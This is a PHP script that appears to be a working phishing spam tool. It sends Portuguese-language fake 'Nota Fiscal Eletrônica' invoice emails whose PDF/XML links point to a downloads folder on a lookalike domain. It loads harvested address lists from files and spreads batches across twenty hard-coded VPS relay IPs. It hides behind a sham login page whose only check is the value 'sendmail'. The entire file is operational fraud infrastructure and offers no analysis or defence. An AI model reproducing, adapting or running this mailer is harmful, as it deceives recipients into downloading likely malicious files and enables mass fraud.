<?php
set_time_limit(0);
function sendmail($to, $vps)
{
	$date = new DateTime();
	$date->modify('-10 hour');
	
	$link = 'https://www.notasfiscalonline.net/downloads/';
	$html = '
	<html>
	<head>
	<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
	<title>NOTA FISCAL</title>
	</head>
	<body>
	<div>
		<span><strong>Emissao de NF-e (Nota Fiscal Eletronica)</strong></span>
	</div>
	<div><span>Prezado (A)</span></div>
	<div></div>
	<div>
		<span>
			Foi emitida uma NF-e (Nota Fiscal Eletronica) referente ao seu pedido n '.rand(100000000,999999999).', realizado em '.$date->format('d/m/Y').' as '.$date->format('H:i').'
		</span>
	</div>
	<div></div>
	<div><span>NF-e Nota Fiscal Eletronica</span></div>
	<div></div>
	<div><span>Escolha abaixo a melhor forma de consultar sua NF-e</span></div>
	<span><br></span>
	<ul>
		<li><big><a href="'.$link.'">Visualizar em formato PDF</a></big></li>
		<li><big><a href="'.$link.'">Visualizar em formato XML</a></big></li>
	</ul>
	</body>
	</html>
	';
	$assunto = 'NFe - FISCAL';
	$nome = 'NFe - FISCAL';
	$de = 'administrativo@notasfiscalonline.net';
	
	$ativo = true;
	if($ativo)
	{
		echo $vps.' - ';
		$cr = curl_init();
		curl_setopt($cr, CURLOPT_URL, "http://".$vps."/");
		curl_setopt($cr, CURLOPT_CONNECTTIMEOUT ,0); 
		curl_setopt($cr, CURLOPT_TIMEOUT, 3600);
		curl_setopt($cr, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($cr, CURLOPT_POST, TRUE);
		curl_setopt($cr, CURLOPT_POSTFIELDS, "veio=sim&html=".$html."&assunto=".$assunto."&nome=".$nome."&de=".$de."&emails=".$to);
		$retorno = curl_exec($cr);
		curl_close($cr);
		return $retorno;
	}
	else
	{
		return 'Envio: '.$envios.' - '.$vps.'<br>';
	}
}



if(isset($_REQUEST['login']))
{
	if($_REQUEST['login'] == 'sendmail')
	{		
		//VPS Novas
		$vps = array();
		$vps[] = '80.211.236.7'; //0
		$vps[] = '212.237.3.228'; //1
		$vps[] = '212.237.5.179'; //2
		$vps[] = '94.177.218.47'; //3
		$vps[] = '212.237.21.180'; //4
		$vps[] = '94.177.196.72'; //5
		$vps[] = '94.177.197.143'; //6
		$vps[] = '5.249.149.173'; //7
		$vps[] = '94.177.202.154'; //8
		$vps[] = '212.237.9.58'; //9
		$vps[] = '212.237.31.214'; //10
		$vps[] = '212.237.62.18'; //11
		$vps[] = '212.237.5.136'; //12
		$vps[] = '80.211.236.121'; //13
		$vps[] = '94.177.171.161'; //14
		$vps[] = '80.211.224.212'; //15
		$vps[] = '212.237.25.112'; //16
		$vps[] = '80.211.151.103'; //17
		$vps[] = '80.211.236.78';  //18
		$vps[] = '80.211.166.133'; //19
		
		$contador = array();
		$spamer = array();
		$handle = @fopen("config.txt", "r");
		if($handle)
			while (($buffer = fgets($handle, 4096)) !== false)
				array_push($spamer, $buffer);
		fclose($handle);
		
		//Quantidade de Emails
		$quantidade = (int) trim($spamer[0]);
		
		if($spamer[2] == 'on')
		{
			
			$emails = array();
			$pasta = 'download/emails';
			if(is_dir($pasta))
			{
				$diretorio = dir($pasta);
				while(($file = $diretorio->read()) !== false)
				{
					if($file != '.' && $file != '..')
					{
						if(file_exists($pasta.'/'.$file))
							if(is_file($pasta.'/'.$file))
							{
								$handle = fopen($pasta.'/'.$file, "r");
								while(!feof($handle))
									array_push($emails, fgets($handle));
								fclose($handle);
							}
					}
				}
				$diretorio->close();
			}
			
			$contadorgeral = 0;
			$handle = @fopen('contador3.txt', 'r');
			while(!feof($handle))
				$contadorgeral = $contadorgeral + (int) fgets($handle);
			fclose($handle);
			
			if(($contadorgeral + $quantidade)>count($emails))
				exit('finished');
			
			$handle = fopen('contador3.txt', 'a');
			fwrite($handle, $quantidade . PHP_EOL);
			fclose($handle);
			
			$handle = @fopen('contador4.txt', 'a');
			fwrite($handle, ($contadorgeral + $quantidade).PHP_EOL);
			fclose($handle);

			$handle = @fopen('contador.txt', 'r');
			$envios = (int) fgets($handle);
			$envios++;
			if($envios>=count($vps))
				$envios = 0;
			fclose($handle);

			$handle = @fopen('contador.txt', 'w+');
			fwrite($handle, $envios);
			fclose($handle);
			
			$handle = fopen('contador2.txt', 'a');
			fwrite($handle, $envios . ' + ' . ($contadorgeral + $quantidade) . ' - ' . date('Y-m-d H:i:s') . PHP_EOL);
			fclose($handle);
			
			$send = true;
			if($send)
			{
				$to = '';
				for($i=(int)$contadorgeral;$i<=(int)($contadorgeral+$quantidade);$i++)
				{
					$to .= trim($emails[$i]).",";
					if($i==($contadorgeral+$quantidade) && $i<=count($emails))
					{
						echo $envios.' - ';
						$to .= $spamer[1];
						$log = sendmail($to, $vps[$envios]);
						if($log)
						{
							print $log;
							//print '<meta http-equiv="refresh" content="1; url='.$_SERVER['PHP_SELF'].'?login=sendmail">';
						}
					}
				}
			}
		}
		else
			exit('<font color="red">system offline</font>');
	}
	else
	{
		echo 'Usuários e Senhas Inválidos';
	}
}
else
{	
?>
<!DOCTYPE html>
<html>
<head>
	<title>NFe - Nota Fiscal Eletrônica</title>
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="//code.jquery.com/mobile/1.4.5/jquery.mobile-1.4.5.min.css" />
	<script src="//code.jquery.com/jquery-1.11.1.min.js"></script>
	<script src="//code.jquery.com/mobile/1.4.5/jquery.mobile-1.4.5.min.js"></script>
	<script>
	function login() {
		location.href = 'index.php?login&usuario='+$("#usuario").val()+'&senha='+$("#senha").val();
	}
	</script>
</head>
<body>

<div data-role="page">

	<div data-role="header">
		<h1>NFe - Nota Fiscal Eletrônica</h1>
	</div><!-- /header -->

	<div role="main" class="ui-content">
		<form method="post">
		Usuário: <br>
		<input type="text" name="usuario" id="usuario" />
		Senha: <br>
		<input type="password" name="senha" id="senha" />
		<br>
		<a data-role="button" onclick="login();">Entrar</a>
		</form>
	</div><!-- /content -->

	<div data-role="footer">
		<h4>Ultima Atualizacao: <?=date('d/m/Y H:i:s');?></h4>
	</div><!-- /footer -->
</div><!-- /page -->

</body>
</html>
<?php } ?>